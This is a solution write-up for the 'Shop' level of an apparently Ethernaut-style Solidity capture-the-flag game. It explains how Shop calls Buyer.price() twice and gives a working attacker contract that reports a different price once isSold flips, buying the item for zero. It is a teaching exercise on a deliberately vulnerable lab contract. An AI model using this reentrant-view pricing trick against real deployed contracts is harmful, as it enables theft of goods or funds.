# 21. Shop
<sup>Difficulty 4/10</sup>

Сan you get the item from the shop for less than the price asked?

Things that might help:

- `Shop` expects to be used from a `Buyer`
- Understanding restrictions of view functions

## Solution

We need to buy the item for less than shop asks. 

In order to buy the item for less than price we still need to buy the item once. The `buy` function checks `Buyer.price() >= price` and `!isSold`. If we met the requirements we can then set the price.

```solidity
function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
}
```

The error is to call the `Buyer.price()` function twice instead than one and store the variable. Also, the second time the function is called is after the updates of the `isSold` variable.

Since we need to override the `Buyer.price()` function we can return the price we want based on the `isSold` variable

```solidity
contract Me is Buyer {
    Shop shop = Shop(0x66ae82655A68E854A99db69Ab326D99e832C526a);
    function price() public view override returns (uint) {
        return shop.isSold() ? 0 : 100;
    }
    function buy() public {
        shop.buy();
    }
}
```

The first time that the `price()` function is called the value will be `100`.
The second time it will be `0`, so the `Shop.price` variable will be set to `0`.

```
|[●▪▪●]| Well done, You have completed this level!!!
```

## OZ Corner

Contracts can manipulate data seen by other contracts in any way they want.

It's unsafe to change the state based on external and untrusted contracts logic.
